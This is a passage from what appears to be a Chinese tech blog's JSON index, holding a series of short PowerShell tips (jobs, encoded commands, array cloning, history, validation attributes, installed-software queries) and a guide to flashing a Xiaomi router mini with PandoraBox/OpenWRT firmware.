秒（由最长的单个任务时间决定）加上一些额外的上下文时间。 #requires -Version 2 # three things you want to do in parallel # for illustration, Start-Sleep is used # remove Start-Sleep and replace with real-world # tasks $task1 = { Start-Sleep -Seconds 4 dir $home } $task2 = { Start-Sleep -Seconds 8 Get-Service } $task3 = { Start-Sleep -Seconds 11 'Hello Dude' } $job1 = Start-Job -ScriptBlock $task1 $job2 = Start-Job -ScriptBlock $task2 $result3 = &amp; $task3 Wait-Job -Job $job1, $job2 $result1 = Receive-Job -Job $job1 $result2 = Receive-Job -Job $job2 Remove-Job $job1, $job2","link":"/2015/09/25/using-background-jobs/"},{"title":"PowerShell 技能连载 - 用 try..finally 在 PowerShell 关闭时执行代码","text":"如果您需要在 PowerShell 退出之前执行一些代码，您可以像这样简单地使用 try..finally 代码块： try { # some code Start-Sleep -Seconds 20 } finally { # this gets executed even if the code in the try block throws an exception [Console]::Beep(4000,1000) } 这段代码模拟一段长时间运行的脚本。甚至您关闭 PowerShell 窗口时，在 finally 块中的代码也会在 PowerShell 停止之前执行。 当然这得当脚本确实在运行时才有效。","link":"/2015/09/28/use-try-finally-to-execute-code-when-powershell-closes/"},{"title":"PowerShell 技能连载 - 使用编码的脚本","text":"在 VBScript 中有编码的脚本。编码并不是隐藏脚本内容的安全方法，但它能使用户获取代码内容略微更难一点。 以下是一个传入 PowerShell 脚本并对它编码的函数： function ConvertTo-EncodedScript { param ( $Path, [Switch]$Open ) $Code = Get-Content -Path $Path -Raw $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Code) $Base64 = [Convert]::ToBase64String($Bytes) $NewPath = [System.IO.Path]::ChangeExtension($Path, '.pse1') $Base64 | Set-Content -Path $NewPath if ($Open) { notepad $NewPath } } 编码后的脚本将会以 .pse1 扩展名来保存（这是一个完全随意定义的文件扩展名，并不是微软定义的）。 要执行这段编码后的脚本，请运行这段命令（不能在 PowerShell ISE 中运行）： powershell -encodedcommand (Get-Content 'Z:\\pathtoscript\\scriptname.pse1' -Raw) 请注意 PowerShell 最多支持大约 8000 个字符的编码命令。编码命令的本意是安全地将 PowerShell 代码传递给 powershell.exe，而不会被特殊字符打断命令行。","link":"/2015/09/29/using-encoded-scripts/"},{"title":"PowerShell 技能连载 - 复制数组（第 1 部分）","text":"当您复制变量内容时，您也可以只拷贝“引用”（内存地址），而不是内容。请看这个例子： $a = 1..10 $b = $a $b[0] = 'changed' $b[0] $a[0] 虽然您改变了 $b，但 $a 也跟着改变。两个变量都引用了相同的内存地址，所以两者具有相同的内容。 要创建一个数组的全新拷贝，您需要先对它进行克隆： $a = 1..10 $b = $a.Clone() $b[0] = 'changed' $b[0] $a[0]","link":"/2015/09/30/copying-arrays-part-1/"},{"title":"小米路由器 mini 与 OpenWRT","text":"今天拿到小米路由器 mini ，准备对它刷入 OpenWRT 固件。这类操作通常都有些坑，所以将过程记录如下： 初始化 难度 ★★☆☆☆ 陷阱 ★☆☆☆☆ 小米路由器 mini 开箱以后，按照内附的纸质说明书对它进行简单的初始化，使得电脑可以通过它上网。这个过程是面向普通消费者的，所以过程不再赘述。 初始化完成后，路由器 WEB 管理界面中可能会提示有可升级的固件，在此可以忽略，因为我们下一步可能对它进行降级。 在路由器的 USB 口中插入一个格式化为 FAT32 的空白 U 盘，容量在 1GB 以上即可，最好是带指示灯的，这样可以看得到它的读写状态。首次插入 U 盘的时候，小米路由器会向 U 盘里写入十来兆的数据，要等 U 盘指示灯停止闪烁以后再进行后续的断电、刷机等操作比较保险。 用小米路由器的手机 APP（扫盒子上的二维码下载）将路由器和小米账户绑定。这步是打开 SSH 的基础。 固件降级 难度 ★★☆☆☆ 陷阱 ★★★☆☆ 为了打开 SSH 功能，我们需要刷入小米路由 mini 的开发版固件。注意，我们不仅不能刷入最新版的固件，相反，要对已有的固件降级。因为经过一系列实验，发现若使用高版本的小米路由器 mini 固件，在后续打开 SSH 操作的时候，会遇到黄灯闪烁 3 秒后变成了红灯的问题。 请自行搜索 0.6.40 版的 miwifi_r1cm_all_ace8a_0.6.40.bin 并下载，这个版本亲测可以用。官网的MiWiFi成长日志提供的 0.8.x 和 0.7.x 版都无法打开 SSH。 然后在路由器的 WEB 控制台的路由设置中手动刷入上述 .bin 文件。按照提示等待 5-8 分钟，就可以再次进入路由器的 WEB 控制台了。可以在 WEB 控制台中确认降级成功。 打开 SSH 难度 ★★★☆☆ 陷阱 ★★☆☆☆ 打开 SSH 意味着失去保修。不过准备继续折腾的人早已做好放弃保修的准备了。 访问MiWiFi – 小米路由器官网，点击“开放/开启 SSH 工具/下载工具包”，并记下 root 密码。注意这将下载一个专属的 miwifi_ssh.bin 文件，同款不同机器是不通用的。 把下载下来的 miwifi_ssh.bin 复制到刚才的 U 盘中。断电，插入 U 盘，按住复位键，通电，在黄色指示灯闪烁的时候，放开复位键，等待….当指示灯变成 蓝色长亮的时候，说明我们获取到 root 权限并启动 SSH 服务了。 刷入 PandoraBox 难度 ★★★☆☆ 陷阱 ★★★☆☆ 访问 Index of /PandoraBox/Xiaomi-Mini-R1CM/，目前 stable 目录下没东西，只有 testing 目录下有东西，也就是只有测试版。 下载最新的 PandoraBox-ralink-mt7620-xiaomi-mini-squashfs-sysupgrade-r460-20150216.bin（还有个文件名不带 mt7620 字样的固件不知道是做什么的）。 用 XSHELL、SecureCRT、PUTTY 等 SSH 客户端，以及 WinSCP 文件传输器（以 SCP 协议）以前面记录的 root 密码登录 192.168.31.1。 用 WinSCP 把下载的 PandoraBox 固件上传到小米路由 mini 的 /tmp/ 目录下，顺便改个短点的名字 PandoraBox.bin。 在 SSH 客户端中执行以下命令开始刷入 PandoraBox 固件： mtd -r write /tmp/PandoraBox.bin firmware 注意，如果遇到 Could not open mtd device: firmware 提示，请按前面的步骤进行固件降级。 等路由重启后，可以搜索到信号PandoraBox_XXXX，没有密码，连上去后进入192.168.1.1，密码 admin，之后就能看到可爱的 OpenWRT 界面了。 刷 u-boot刷 u-boot 应该在刷 PandoraBox 步骤之前。刷 PandoraBox u-boot 不是必须的，但是刷了可以方便后续的上传固件，不用一直SS H 操作。 u-boot是一种普遍用于嵌入式系统中的Bootloader,Bootloader是在操作系统运行之前执行的一小段程序。他可以用来恢复小米路由器的固件，可以说只要刷了uboot，你的路由器基本上刷不死了。 小米 u-boot 的用法是将固件命名为 miwifi.bin，存在 FAT32 U 盘根目录中，插入路由器，按住 reset 键接通电源，待黄灯闪烁之后松开。 PandoraBox u-boot 的用法是将 PC 网卡配置成 192.168.1.2/255.255.255.0/192.168.1.1，按住 reset 键接通电源，待黄灯闪烁之后松开，用 PC 浏览器打开 http://192.168.1.1，即可通过上传 PandoraBox 的固件来刷。 注意，小米官方的 u-boot 和 PandoraBox 的不同。刷了 PandoraBox 的固件之后，不能通过 WEB 方式刷小米固件，但可以通过 WEB 方式刷小米 u-boot，然后通过小米 u-boot 可以刷小米固件。这样来实现从 PandoraBox 刷回原产小米固件。 主要攻略如下： 小米路由器mini折腾之刷不死uboot篇 - 老高的技术博客小米mini使用不死uboot刷宽带宝教程 - 交流讨论 - 宽带宝论坛 - Powered by Discuz! 参考 MiWiFi – 小米路由器官网 如果通过小米路由器来访问，实际上访问的可能是路由器内部的管理界面。 使用小米路由器mini刷pandorabox并使用ChinaDNS-C + dnsmasq + shadowsocks 实现透明翻墙 小米路由mini潘多拉+OpenWrt+stable版+完美解决软件源+Transmission+MultiWan+Python 【小米路由器mini刷机】mini刷潘多拉固件教程（固件已更新）_小米路由器_MIUI论坛","link":"/2015/09/30/miwifimini-with-OpenWRT/"},{"title":"PowerShell 技能连载 - 复制数组（第 2 部分）","text":"在前一个技能中我们解释了如何用 Clone() 方法安全地“克隆”一个数组。这将把一个数组的内容复制到一个新的数组。 然而，如果数组的元素是对象（不是数字或字符串等原始数据类型），数组存储了这些对象的内存地址，所以克隆方法虽然创建了一个新的数组，但是新的数组仍然引用了相同对象。请看： $object1 = @{Name='Weltner'; ID=12 } $object2 = @{Name='Frank'; ID=99 } $a = $object1, $object2 $b = $a.Clone() $b[0].Name = 'changed' $b[0].Name $a[0].Name 虽然您克隆了数组 $a，但是新的数组 $b 仍然引用了相同的对象，对对象的更改会同时影响两个数组。只有对数组内容的更改是独立的： $object1 = @{Name='Weltner'; ID=12 } $object2 = @{Name='Frank'; ID=99 } $a = $object1, $object2 $b = $a.Clone() $b[0] = 'deleted' $b[0] $a[0]","link":"/2015/10/01/copying-arrays-part-2/"},{"title":"PowerShell 技能连载 - 复制对象","text":"在前一个技能中我们演示了 PowerShell 是通过引用存储对象的。如果您想创建一个浮板，您可能需要手工复制对象的所有属性。 以下是一个简单的克隆对象的方法： $object1 = @{Name='Weltner'; ID=12 } $object2 = @{Name='Frank'; ID=99 } $a = $object1, $object2 # clone entire object by serializing it back and forth: $b = $a | ConvertTo-Json -Depth 99 | ConvertFrom-Json $b[0].Name = 'changed' $b[0].Name $a[0].Name 不过，请注意序列化的过程可能会改变复制的对象类型。 PS C:\\&gt; $a[0].GetType().FullName System.Collections.Hashtable PS C:\\&gt; $b[0].GetType().FullName System.Management.Automation.PSCustomObject PS C:\\&gt;","link":"/2015/10/02/cloning-objects-0/"},{"title":"PowerShell 技能连载 - 获取最后启动时间","text":"在 PowerShell 3.0 以上版本中，可以很容易地用 Get-CimInstance 从 WMI 中获取真实的 DateTime 类型信息。这段代码将告诉您系统上次启动的时间： #requires -Version 3 (Get-CimInstance -ClassName Win32_OperatingSystem).LastBootUpTime 在 PowerShell 2.0 中，您只能使用 Get-WmiObject，它是以 WMI 格式反馈数据的： (Get-WmiObject -Class Win32_OperatingSystem).LastBootUpTime 这里，您必须手工转换 WMI 格式： $object = Get-WmiObject -Class Win32_OperatingSystem $lastboot = $object.LastBootUpTime $object.ConvertToDateTime($lastboot) ConvertToDateTime() 转换函数实际上是一个附加的方法。在这个场景背后，是一个静态方法实现了以上工作： $object = Get-WmiObject -Class Win32_OperatingSystem $lastboot = $object.LastBootUpTime [System.Management.ManagementDateTimeConverter]::ToDateTime($lastboot)","link":"/2015/10/05/getting-last-bootup-time/"},{"title":"PowerShell 技能连载 - 增加历史缓存","text":"当您在 PowerShell 会话中工作一段时间以后，命令历史可能十分有用。每个会话存储了您输入的所有命令，您可以按上下键浏览已输入的命令。 您甚至可以这样搜索历史缓存： PS C:\\&gt; #obje 键入一个注释符（# 号），然后跟上您所能回忆起的命令关键字，然后按下 TAB 键，每按一次 TAB 将会显示命令历史中匹配的一条命令（如果没有匹配成功，将不会显示）。 要限制命令历史的大小，请使用 $MaximumHistoryCount 变量。缺省值是 4096。 PS C:\\&gt; $MaximumHistoryCount 4096 PS C:\\&gt; $MaximumHistoryCount = 32KB-1 PS C:\\&gt; $MaximumHistoryCount 32767 PS C:\\&gt; 历史缓存最大允许的容量是 32KB-1。","link":"/2015/10/06/increase-history-cache/"},{"title":"PowerShell 技能连载 - 复制命令历史","text":"您可以将整个命令历史拷贝到剪贴板中： (Get-History).CommandLine | clip.exe 该技术使用 PowerShell 3.0 带来的自动展开技术。若要在 PowerShell 2.0 中使用它，您需要像这样手工展开属性： Get-History | Select-Object -ExpandProperty commandline | clip.exe 要只拷贝最后五条命令，只需要为 Get-History 命令加上 -Count 参数即可： (Get-History -Count 5).CommandLine | clip.exe","link":"/2015/10/07/copying-command-history-0/"},{"title":"PowerShell 技能连载 - 为什么 $MaximumHistoryCount 容量有限","text":"如果您想增加最大命令历史的容量，您可能会遇到这样的限制： PS C:\\&gt; $MaximumHistoryCount = 100000 The variable cannot be validated because the value 100000 is not a valid value for the Maximum HistoryCount variable. 这里并没有提示合法的范围是多少。有意思的地方是这个变量的合法范围保存在哪。答案是：您可以查询这个变量的 ValidateRange 属性： $variable = Get-Variable MaximumHistoryCount $variable.Attributes $variable.Attributes.MinRange $variable.Attributes.MaxRange 但您遇到一个变量在原始数据类型之外有数值限制，您可能需要检查变量的属性来确认其中是否有验证器属性。","link":"/2015/10/08/why-maximumhistorycount-has-a-limit/"},{"title":"PowerShell 技能连载 - 为变量增加 ValidateRange","text":"如果您希望为一个变量增加一个合法数值的范围，您可以向该变量添加一个 ValidateRange 属性，很像函数参数的工作方式。唯一的区别在，它手工作用于您期望的变量上： $test = 1 $variable = Get-Variable test $validateRange = New-Object -TypeName System.Management.Automation.ValidateRangeAttribute(1,100) $variable.Attributes.Add($validateRange) $test = 10 $test = 100 $test = 1000 变量 $test 现在只允许 1 到 100 的数值。当您试图赋一个该范围之外的值时，会得到一个异常。 PS C:\\&gt; $test = 101 The variable cannot be validated because the value 101 is not a valid value for the test variable. At line:1 char:1 + $test = 101 + ~~~~~~~~~~~ + CategoryInfo : MetadataError: (:) [], ValidationMetadataException + FullyQualifiedErrorId : ValidateSetFailure","link":"/2015/10/09/adding-validaterange-to-a-variable/"},{"title":"PowerShell 技能连载 - 快速创建编码的 PowerShell 命令","text":"当在 PowerShell 控制台之外执行 PowerShell 代码时，您需要传递代码给 powershell.exe。要确保您的代码不与特殊字符冲突，命令可以编码后传给 powershell.exe。 一个最简单的将纯文本命令行转换为编码后的命令的方法如下： PS C:\\&gt; cmd /c echo powershell { Get-Service | Where-Object Status -eq Running } powershell -encodedCommand IABHAGUAdAAtAFMAZQByAHYAaQBjAGUAIAB8ACAAVwBoAGUAcgBlAC0ATwBiAGoAZQ BjAHQAIABTAHQAYQB0AHUAcwAgAC0AZQBxACAAUgB1AG4AbgBpAG4AZwAgAA== -inputFormat xml -outputFormat xml PS C:\\&gt; Here you’d find out that you can run the Get-Service | Where-Object statement as an encoded command like this:然后可以以这样的方式执行编码后的 Get-Service | Where-Object 语句。 powershell.exe -encodedCommand IABHAGUAdAAtAFMAZQByAHYAaQBjAGUAIAB8ACAAVwBoAGUAcgBlAC0ATwBiAGoAZQBjAHQAIABTAHQAYQB0AHUAcwAgAC0AZQBxACAAUgB1AG4AbgBpAG4AZwAgAA== 当您在 cmd.exe（或 PowerShell 控制台中）运行这段语句时，您能够得到所有运行中的服务。只需要移除 -inputFormat 和 -outputFormat 参数，并且移除所有换行符。编码后的命令是一个长长的字符串。","link":"/2015/10/12/creating-encoded-powershell-commands-on-the-fly/"},{"title":"PowerShell 技能连载 - 删除别名","text":"在 PowerShell 中创建新的别名很常见。但是如果您做错了什么，要怎么办？ PS C:\\&gt; Set-Alias -Name ping -Value notepad PS C:\\&gt; ping 127.0.0.1 当创建了一个别名之后，并没有 cmdlet 可以移除它。您必须得关闭 PowerShell 并打开一个新的 PowerShell 会话来“忘记”掉自定义的别名。 或者，您可以利用 alias: 虚拟驱动器，并且像移除文件一样移除别名： PS C:\\&gt; del alias:ping PS C:\\&gt; ping 127.0.0.1 Pinging 127.0.0.1 with 32 bytes of data: Reply from 127.0.0.1: bytes=32 time&lt;1ms TTL=128 Reply from 127.0.0.1: bytes=32 time&lt;1ms TTL=128 Reply from 127.0.0.1: bytes=32 time&lt;1ms TTL=128 Reply from 127.0.0.1: bytes=32 time&lt;1ms TTL=128 Ping statistics for 127.0.0.1: Packets: Sent = 4, Received = 4, Lost = 0 (0% loss), Approximate round trip times in milli-seconds: Minimum = 0ms, Maximum = 0ms, Average = 0ms PS C:\\&gt;","link":"/2015/10/13/deleting-aliases1/"},{"title":"PowerShell 技能连载 - 为什么 GetTempFileName() 是有害的","text":"有些人可能会用 .NET 方法来试图生成一个随机的临时文件名： $path = [System.IO.Path]::GetTempFileName() $path 它确实可以用。不过它还做了些别的事情。它实际上用那个文件名创建了一个空白文件： PS C:\\&gt; Test-Path $path True 如果您没有清除临时文件，将会在创建了 65535 个临时文件之后得到一个异常。 在 PowerShell 5.0 中，New-TemporaryFile 做了相同的事情，但是它返回了一个文件，这样您可以立即确认确实创建了一个文件，而不是一个文件名。","link":"/2015/10/14/why-gettempfilename-is-evil/"},{"title":"PowerShell 技能连载 - 创建临时文件名","text":"如果您只是需要创建一个临时文件名（而不是真的需要创建该文件），而且您希望控制文件的扩展名，以下是一个实现该需求的简单函数： $elements = @() $elements += [System.IO.Path]::GetTempPath() $elements += [System.Guid]::NewGuid() $elements += 'csv' $randomPath = '{0}{1}.{2}' -f $elements $randomPath 您可以很容易地根据它创建您自己的函数： function New-TemporaryFileName($Extension='txt') { $elements = @() $elements += [System.IO.Path]::GetTempPath() $elements += [System.Guid]::NewGuid() $elements += $Extension.TrimStart('.') '{0}{1}.{2}' -f $elements } 这是该函数的使用方法： PS C:\\&gt; New-TemporaryFileName C:\\Users\\Tobias\\AppData\\Local\\Temp\\8d8e5001-2be8-469d-9bc8-e2e3324cce66.txt PS C:\\&gt; New-TemporaryFileName ps1 C:\\Users\\Tobias\\AppData\\Local\\Temp\\412c40df-e691-44c1-8c94-f7ce30bb4875.ps1 PS C:\\&gt; New-TemporaryFileName csv C:\\Users\\Tobias\\AppData\\Local\\Temp\\47b1a65f-2705-4926-8a72-21f05430f2c5.csv","link":"/2015/10/15/creating-temporary-filenames/"},{"title":"PowerShell 技能连载 - 简化参数属性","text":"如果您的系统运行的是 PowerShell 3.0 及以上版本，您可以简化函数参数的属性。布尔属性的缺省值都为 $true，所以这在 PowerShell 2.0 中是缺省代码： function Get-Sample { Param ( [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true)] [string] $Name ) } 从 PowerShell 3.0 开始，它浓缩成： function Get-Sample { Param ( [Parameter(Mandatory, ValueFromPipeline, ValueFromPipelineByPropertyName)] [string] $Name ) } 新的代码更精炼，但是无法在 PowerShell 2.0 中运行。","link":"/2015/10/16/simplify-parameter-attributes/"},{"title":"PowerShell 技能连载 - 查找 cmdlet 参数别名","text":"PowerShell cmdlet 和函数可以带有参数，并且这些参数可以有（更短的）别名。一个典型的例子是 -ErrorAction 通用参数，它也可以通过 -ea 别名访问。 参数别名不是自动完成的。您需要预先知道它们。以下这个脚本可以提取任意 PowerShell 函数或 cmdlet 的参数别名： #requires -Version 3 $command = 'Get-Process' (Get-Command $command).Parameters.Values | Select-Object -Property Name, Aliases","link":"/2015/10/19/finding-cmdlet-parameter-aliases/"},{"title":"PowerShell 技能连载 - 查找已加载的程序集","text":"要列出一个 PowerShell 会话中加载的所有 .NET 程序集，请试试这段代码： [System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object Location | Sort-Object -Property FullName | Select-Object -Property Name, Location, Version | Out-GridView 列出和对比已加载的程序集可以有助于对比 PowerShell 会话，并且检查区别。多数时间，区别在于已加载的模块，所以如果缺少了程序集，您可能需要先加载一个 PowerShell 模块来使用它们。 或者，您可以使用 Add-Type 命令根据名字或文件地址手动加载程序集。","link":"/2015/10/20/finding-loaded-assemblies/"},{"title":"PowerShell 技能连载 - 自动修正 PowerShell 代码的大小写","text":"当您编写 PowerShell 脚本时，可能常常没有使用正确的大小写，或只使用部分参数名，或使用别名而不是 cmdlet 名称。这些技术上都是可行的，因为 PowerShell 命令是大小写不敏感的，参数名可以省略，并且别名也是一种合法的命令类型。 然而，当使用正确的的大小写、完整的参数名称，以及 cmdlet 名字而不是别名时，脚本的可读性会更好。 在 PowerShell ISE 中，要纠正这些东西，只需要将光标放置在命令名或参数名处，然后按下 TAB 键。Tab 展开功能将会读取原有的代码并将它替换成大小写正确的、名字完整的版本。","link":"/2015/10/21/auto-casecorrecting-powershell-code/"},{"title":"PowerShell 技能连载 - 增加“命令未找到”处理器","text":"当 PowerShell 遇到一个未知的命令名时，您会见到一条红色的信息。 然而，从 PowerShell 3.0 开始，引入了一个“CommandNotFoundHandler”功能，可以在程序中使用。它可以记录信息，或者尝试解决问题。 这是一个简单的例子。当您运行这段代码后，无论何时遇到一个 PowerShell 不知道的命令，它会运行 Show-Command 并用合法的命令打开一个帮助工具： $ExecutionContext.InvokeCommand.CommandNotFoundAction = { param( [string] $commandName, [System.Management.Automation.CommandLookupEventArgs] $eventArgs ) Write-Warning &quot;Command $commandName was not found. Opening LookilookiTool.&quot; $eventArgs.CommandScriptBlock = { Show-Command } }","link":"/2015/10/22/adding-command-not-found-handler/"},{"title":"PowerShell 技能连载 - 试试 CTRL+SPACE！","text":"在 PowerShell ISE 中，有两个键盘快捷键可能对您有用。按下 TAB 键的功能就像在控制台中一样，并且每次您按下 TAB，您会得到一个 Tab 展开的结果。 CTRL + SPACE 是另一个重要的键盘快捷键。它将打开智能感知菜单。由于大多数情况下 ISE 自动打开这些菜单，所以大多数用户从来没有注意过 CTRL + SPACE，但它重打开一个错过的智能感知菜单功能十分有用。 从 PowerShell 5.0 开始，CTRL + SPACE 变得更为重要，特别是当您在书写 DSC（所需状态配置）配置脚本时。PowerShell ISE 提供了针对 DSC 的扩展智能感知帮助，但在许多情况下并不会自动弹出智能感知菜单。仅当按下 CTRL + SPACE 时才能获得智能感知帮助。","link":"/2015/10/23/try-ctrl-space/"},{"title":"PowerShell 技能连载 - 帮助 PowerShell 做得更好！","text":"与其批评不正常的功能，或是缺少的功能，不如一起参与建设！PowerShell 团队做了很大努力来改进和扩展 PowerShell。现在只需要您的反馈意见。 这是一站式服务地址：https://connect.microsoft.com/PowerShell 当您打开那个网页时，您可以一键提交 bug、发送反馈，或是为新的功能投票。您需要用一个免费的微软账号登录。","link":"/2015/10/26/help-make-powershell-a-better-place/"},{"title":"PowerShell 技能连载 - 在命令提示符中显示路径","text":"缺省的 PowerShell 提示符显示当前的位置。当您在很深的嵌套文件夹中时，这将占用您的输入空间，而且会导致需要滚动才能看清。 有很多方法可以解决这个问题。以下是针对这个题的两个 prompt 的替代函数。 第一个是保持在当前提示符中显示当前路径，但实际的输入是在下面一行，所以您的输入总是可见。 function prompt { Write-Host(&quot;PS: $pwd&gt;&quot;) } 另一种方式是在窗体的标题栏显示当前的路径： function prompt { $host.UI.RawUI.WindowTitle = Get-Location 'PS&gt; ' } 如果您想用这些方法，请将它们放在自启动脚本中（缺省情况下可能不存在）。它的路径可以通过 $profile 变量找到。","link":"/2015/10/27/using-paths-in-prompts/"},{"title":"PowerShell 技能连载 - 为什么捕获不到某些错误","text":"当您在 PowerShell 中收到一条红色的错误信息时，您总是可以用一个 try..catch 代码块将代码包裹起来，然后自行处理该错误： try { 1/0 } catch { Write-Warning &quot;Something crazy happened: $_&quot; } 然而，一些错误，特别是来自 cmdlet 的，并不能被处理。当那些情况发生时，说明缺失的错误是被 cmdlet 内部的错误处理器处理了，并且您可以通过 -ErrorAction 通用参数来控制 cmdlet 的错误处理器。 当您设置 ErrorAction 的值为 Stop 时，您实际上告知 cmdlet 抛出一个异常，该以上可以被您的异常处理器捕获。 要让所有 cmdlet 发出异常，而不是内部处理，您可以用 $ErrorActionPreference = 'Stop' 语句，该语句将设置所有 cmdlet 的缺省错误动作为“停止”。 请注意它的副作用：当您告知一个 cmdlet 的错误处理器要在某些错误发生时抛出异常，则该 cmdlet 将会在发生第一个错误的地方抛出异常，并且不会继续执行。","link":"/2015/10/28/why-some-errors-aren-t-caught/"},{"title":"PowerShell 技能连载 - 查看操作系统版本","text":"一个最简单的查看操作系统版本号的方法是这一行代码： PS&gt; [Environment]::OSVersion Platform ServicePack Version VersionString -------- ----------- ------- ------------- Win32NT Service Pack 1 6.1.7601.65536 Microsoft Windows N... “Environment”类型提供了您计算机很多方面的信息。例如，操作系统核心的个数： PS&gt; [Environment]::ProcessorCount 4 要查看该类型能做什么，请在 PowerShell ISE 中，键入： [Environment]:: 当您按下第二个冒号时，智能提示将打开一个菜单，里面包含了该类型的所有静态属性和方法。","link":"/2015/10/29/finding-operating-system-version/"},{"title":"PowerShell 技能连载 - 和 Powershell 对话","text":"今日的技能是当您键入一个未知的命令时，使用可编程的 CommandNotFoundHandler 让 PowerShell 和您对话： $ExecutionContext.InvokeCommand.CommandNotFoundAction = { param( [string] $commandName, [System.Management.Automation.CommandLookupEventArgs] $eventArgs ) $Sapi = New-Object -ComObject Sapi.SpVoice $null = $Sapi.Speak(&quot;I don't know $commandName, stupid.&quot;) } 当您运行这段代码（并且打开您的声音）后，当用户输入一个未知的命令时，PowerShell 将会开口说话，并且抱怨它不知道您的命令。您可能会听到该声音两次：如果该命令不以 “get-“ 开头，PowerShell 首先会试图查找一个以 “get-“ 开头，并以您键入的名字结尾的命令。","link":"/2015/10/30/conversation-with-powershell/"},{"title":"PowerShell 技能连载 - 将数字列表转换为有用的列表","text":"PowerShell 将 “..“ 操作符的功能定义为生成一个数字列表。通过 -join 操作符，您可以将这些数字转换为几乎您想要的所有东西，例如逗号分隔的值。 当您希望将数字转换为字符时，您也可以将 ASCII 码转换为字母。 用管道将它们输出到 ForEach-Object，您就可以将它进一步处理成驱动器号。 或者使用 -f 操作符来创建服务器列表。以下是示例代码： #requires -Version 1 1..10 -join ',' [Char[]][Byte[]](65..90) -join ',' ([Char[]][Byte[]](65..90) | ForEach-Object { $_ + ':\\' }) -join ',' 1..10 | ForEach-Object { 'Server{0:0000}' -f $_ }","link":"/2015/11/05/turning-lists-of-numbers-into-useful-lists/"},{"title":"PowerShell 技能连载 - 尽可能使用服务端过滤","text":"当您跨网络获取信息时，请注意只能在最后一步使用客户端技术，例如 Where-Object。服务端过滤技术更有效率。 例如，当您试图根据电子邮箱查找用户时，客户端的 Where-Object 语句将会将所有 AD 用户推到您的计算机上，并且通过本地的 Where-Object 来确认您需要的用户： #requires -Version 1 -Modules ActiveDirectory # inefficient client-side filter Get-ADUser -Filter * | Where-Object { $_.mail -ne $null } 如您猜想的那样，当一个 cmdlet 有一个名为 -Filter 的参数时，它可以在传送数据到您的机器之前，在服务端过滤需要的元素。然而，Get-ADUser 命令的 -Filter 参数有的时候工作起来很困难，需要将类似 PowerShell 的语法转换为 Active Directory 所需的 LDAP 查询。 所以更常见的是，在第一处使用 LDAP 查询字符串更自然。这两条语句将会快速地找出所有包含（和不包含）邮箱地址的用户账户： #requires -Version 1 -Modules ActiveDirectory # any user with a mail address Get-ADUser -LDAPFilter '(mail=*)' # any user with NO mail address Get-ADUser -LDAPFilter '(!mail=*)'","link":"/2015/11/06/use-server-side-filtering-when-possible/"},{"title":"PowerShell 技能连载 - 显示消息对话框","text":"PowerShell 是基于控制台的，但有些时候加入一些简单的对话框也很不错。以下是一个称为 Show-MessageBox 的函数，可以显示所有标准消息框，并支持智能显示参数： #requires -Version 2 Add-Type -AssemblyName PresentationFramework function Show-MessageBox { param ( [Parameter(Mandatory=$true)] $Prompt, $Title = 'Windows PowerShell', [Windows.MessageBoxButton] $Buttons = 'YesNo', [Windows.MessageBoxImage] $Icon = 'Information' ) [System.Windows.MessageBox]::Show($Prompt, $Title, $Buttons, $Icon) } $result = Show-MessageBox -Prompt 'Rebooting.' -Buttons OKCancel -Icon Exclamation if ($result -eq 'OK') { Restart-Computer -Force -WhatIf }","link":"/2015/11/09/display-message-box-dialog/"},{"title":"PowerShell 技能连载 - 从注册表中读取已安装的软件","text":"以下是查看已安装的软件的快速方法。Get-Software 函数读取所有用户的 32 位和 64 位软件的安装地址。 #requires -Version 1 function Get-Software { param ( [string] $DisplayName='*', [string] $UninstallString='*' ) $keys = 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*', 'HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' Get-ItemProperty -Path $keys | Where-Object { $_.DisplayName } | Select-Object -Property DisplayName, DisplayVersion, UninstallString | Where-Object { $_.DisplayName -like $DisplayName } | Where-Object { $_.UninstallString -like $UninstallString } } 它甚至包含了过滤参数，所以您可以当您指定 -DisplayName 或 -UninstallString（或两者）时，您可以轻松地过滤结果，仅显示您期望的软件产品。两个参数都支持通配符。 以下是一个调用的示例，显示所有的 Office 组件到一个网格视图窗口中： Get-Software -DisplayName *Office* | Out-GridView","link":"/2015/11/10/reading-installed-software-from-registry/"},{"title":"PowerShell 技能连载 - 远程获取已安装的软件列表","text":"在前一个技能中，我们介绍了 Get-Software 函数，它可以获取本地计算机已安装的软件。 如果您在远程系统上已经安装了 PowerShell 远程操作（在 Windows Server 2012 及以上版本中默认是开启的），并且如果您拥有合适的权限，请试试这个增强的版本。它同时支持本地和远程调用： #requires -Version 2 function Get-Software { param ( [string] $DisplayName='*', [string] $UninstallString='*', [string[]] $ComputerName ) [scriptblock]$code = { param ( [string] $DisplayName='*', [string] $UninstallString='*' ) $keys = 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*', 'HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' Get-ItemProperty -Path $keys | Where-Object { $_.DisplayName } | Select-Object -Property DisplayName, DisplayVersion, UninstallString | Where-Object { $_.DisplayName -like $DisplayName } | Where-Object { $_.UninstallString -like $UninstallString } } if ($PSBoundParameters.ContainsKey('ComputerName')) { Invoke-Command -ScriptBlock $code -ComputerName $ComputerName -ArgumentList $DisplayName, $UninstallString } else { &amp; $code -DisplayName $DisplayName -UninstallString $UninstallString } } 请注意这个函数如何将查找软件的代码包裹在代码块中。接下来，它将检测 $PSBoundParameters 来判断用户是否传入了 -ComputerName 参数。如果没有传入，该代码将在本地执行。 否则，Invoke-Command 将在指定的远程计算机（支持多台）上运行这段代码。在这个例子中，Invoke-Command 将过滤参数传递给远程代码。","link":"/2015/11/11/getting-installed-software-remotely/"},{"title":"PowerShell 技能连载 - 查找脚本块变量","text":"脚本块定义了一段 PowerShell 代码而并不执行它。最简单的定义脚本块的方法是将代码放入花括号中。 脚本块有一系列高级功能，能够检测花括号内部的代码。其中的一个功能是直接访问抽象语法树 (AST)。AST 可以分分析代码内容。以下是一个读出脚本块中所有变量名的例子： #requires -Version 3 $scriptblock = { $test = 1 $abc = 2 } $scriptblock.Ast.FindAll( { $args[0] -is [System.Management.Automation.Language.VariableExpressionAst] }, $true ) | Select-Object -ExpandProperty VariablePath | Select-Object -ExpandProperty 